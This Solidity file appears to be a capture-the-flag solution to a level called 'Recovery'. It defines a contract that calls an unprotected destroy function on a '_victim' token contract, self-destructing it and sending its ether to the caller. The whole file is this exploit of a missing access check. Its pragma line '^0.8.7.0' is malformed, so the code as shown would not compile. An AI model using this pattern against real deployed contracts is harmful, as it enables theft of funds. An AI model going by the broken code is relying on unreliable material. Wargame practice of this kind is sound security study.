// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7.0;

interface SimpleToken {
  receive() external payable;
  function transfer(address _to, uint _amount) external;
  function destroy(address payable _to) external;
}

contract Recovery {

  function destroyToken(address payable _victim) payable public {
    SimpleToken(_victim).destroy(payable(msg.sender));
  }
}
